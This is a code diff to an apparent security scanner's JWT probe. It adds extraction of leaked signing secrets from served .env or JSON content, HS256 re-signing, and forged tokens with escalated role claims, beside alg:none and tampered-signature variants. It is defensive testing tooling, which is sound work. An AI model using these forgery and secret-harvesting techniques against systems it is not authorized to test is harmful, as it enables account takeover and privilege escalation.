@@ -8,6 +8,7 @@
 // receipt is a `differential` bundle whose control is the no-token 401 and whose
 // attack is the accepted forged request. Requires verified ownership (gated by
 // the caller, like the other active probes).
+import crypto from "crypto";
 import { safeFetch } from "./ssrf.js";
 import type { ExploitEvidence } from "../src/types.js";
 import { renderRawRequest, windowAround } from "./evidence.js";
@@ -68,6 +69,36 @@ function escalatedPayloadB64(payloadB64: string): string | null {
   }
 }
 
+// Pulls candidate JWT-SIGNING secrets out of served content (e.g. a leaked
+// .env file) — key names containing JWT_SECRET/SIGNING_SECRET/TOKEN_SECRET,
+// in either .env ("KEY=value") or JSON ("KEY":"value") shape. This is what
+// turns "a secret leaked" (already caught by sensitive-path/SAST scanning)
+// into a provable "...and it defeats real signature verification" chain:
+// forging a token that's VALIDLY SIGNED with the real secret is what makes a
+// leaked JWT secret dangerous in the first place — indistinguishable from a
+// legitimately-issued token to any endpoint that only checks the signature.
+// Deliberately narrow key-name matching and a length floor to keep this a
+// precise signature match, not a guess.
+const JWT_SECRET_KEY_RE = /\b[A-Z][A-Z0-9_]*(?:JWT|SIGNING|TOKEN)_SECRET\w*["']?\s*[=:]\s*["']?([^"'\s,}]{16,})/g;
+
+export function extractJwtSecretCandidates(bodyText: string): string[] {
+  if (!bodyText) return [];
+  const out = new Set<string>();
+  let m: RegExpExecArray | null;
+  JWT_SECRET_KEY_RE.lastIndex = 0;
+  while ((m = JWT_SECRET_KEY_RE.exec(bodyText)) !== null) {
+    out.add(m[1]);
+    if (out.size >= 5) break; // bounded — this is meant to catch a handful of real leaks, not harvest arbitrarily
+  }
+  return [...out];
+}
+
+function signHs256(payloadB64: string, secret: string): string {
+  const header = b64url(JSON.stringify({ alg: "HS256", typ: "JWT" }));
+  const signature = crypto.createHmac("sha256", secret).update(`${header}.${payloadB64}`).digest("base64url");
+  return `${header}.${payloadB64}.${signature}`;
+}
+
 async function timedGet(url: string, headers: Record<string, string>): Promise<{ res: Response; text: string }> {
   const ctl = new AbortController();
   const id = setTimeout(() => ctl.abort(), 5000);
@@ -98,16 +129,28 @@ function distinctiveProof(authed: string, unauth: string): string | null {
 // applied to the exposed-user-object probe in server/apiProbes.ts.
 const COMMON_PROTECTED_PATHS = ["/api/admin/settings", "/api/admin", "/api/account", "/api/user/profile", "/api/settings", "/api/me"];
 
-export async function probeJwtAuth(url: string, headers: Record<string, string>): Promise<any | null> {
+export async function probeJwtAuth(
+  url: string,
+  headers: Record<string, string>,
+  secretCandidates: string[] = [],
+  discoveredUrls: string[] = [],
+): Promise<any | null> {
   const authz = headers["Authorization"] || headers["authorization"];
   const jwt = parseJwt(authz);
   if (!jwt) return null; // no Bearer JWT supplied — probe not applicable
   if (jwt.alg.toLowerCase() === "none") return null; // already unsigned; nothing to forge
 
   const base = url.replace(/\/+$/, "");
-  const candidates = [url, ...COMMON_PROTECTED_PATHS.map((p) => `${base}${p}`)];
+  // The fixed guess list alone misses real apps whose protected path doesn't
+  // match a common admin-y name (e.g. /api/profiles-safe) — same class of gap
+  // already fixed for the exposed-user-object probe and the i18n probe: feed
+  // in whatever the crawl actually found on this origin, not just guesses.
+  const candidates = [url, ...COMMON_PROTECTED_PATHS.map((p) => `${base}${p}`), ...discoveredUrls];
+  const seen = new Set<string>();
   for (const candidateUrl of candidates) {
-    const finding = await tryJwtDifferential(candidateUrl, jwt, headers);
+    if (seen.has(candidateUrl)) continue;
+    seen.add(candidateUrl);
+    const finding = await tryJwtDifferential(candidateUrl, jwt, headers, secretCandidates);
     if (finding) return finding;
   }
   return null;
@@ -118,7 +161,12 @@ export async function probeJwtAuth(url: string, headers: Record<string, string>)
 // either "auth isn't enforced here" or "the forgery was correctly rejected" —
 // both are indistinguishable to the caller, which just tries the next
 // candidate either way.
-async function tryJwtDifferential(url: string, jwt: ParsedJwt, headers: Record<string, string>): Promise<any | null> {
+async function tryJwtDifferential(
+  url: string,
+  jwt: ParsedJwt,
+  headers: Record<string, string>,
+  secretCandidates: string[] = [],
+): Promise<any | null> {
   // Everything EXCEPT the auth header — the only variable across the differential.
   const { Authorization, authorization, ...noAuth } = headers;
   void Authorization; void authorization;
@@ -132,6 +180,31 @@ async function tryJwtDifferential(url: string, jwt: ParsedJwt, headers: Record<s
     { variant: "alg:none", token: `${b64url(JSON.stringify({ alg: "none", typ: "JWT" }))}.${jwt.payload}.`, note: 'a token using the "none" algorithm (no signature at all)' },
     { variant: "tampered-signature", token: `${jwt.header}.${jwt.payload}.${jwt.sig ? jwt.sig.slice(0, -1) + (jwt.sig.endsWith("A") ? "B" : "A") : "AAAA"}`, note: "a token whose signature bytes were altered so it no longer verifies" },
   ];
+
+  // A signing secret discovered elsewhere in the same scan (e.g. leaked in a
+  // served .env file) proves a much stronger claim than the two forgeries
+  // above: not just "the signature isn't checked", but "the signature IS
+  // checked, and it verifies anyway, because the secret itself leaked" — a
+  // VALIDLY SIGNED forged token, indistinguishable from a real one to any
+  // endpoint that only checks the signature. Tried with the caller's own
+  // claims first (proves the secret is live at all), then escalated claims
+  // if there's a privilege field to escalate (proves it grants elevated
+  // access, not just "a" access).
+  for (const secret of secretCandidates) {
+    forgeries.push({
+      variant: "leaked-secret-resign",
+      token: signHs256(jwt.payload, secret),
+      note: "a token re-signed with a JWT signing secret discovered elsewhere in this scan (a real, valid signature — not a forgery of the signature check itself)",
+    });
+    const escalated = escalatedPayloadB64(jwt.payload);
+    if (escalated) {
+      forgeries.push({
+        variant: "leaked-secret-resign+escalated-role",
+        token: signHs256(escalated, secret),
+        note: "a token with its role/admin claim escalated, re-signed with a JWT signing secret discovered elsewhere in this scan",
+      });
+    }
+  }
 
   // If the caller's own token carries a privilege claim (role/isAdmin/...),
   // also try forging an alg:none token with that claim ESCALATED. Reusing the
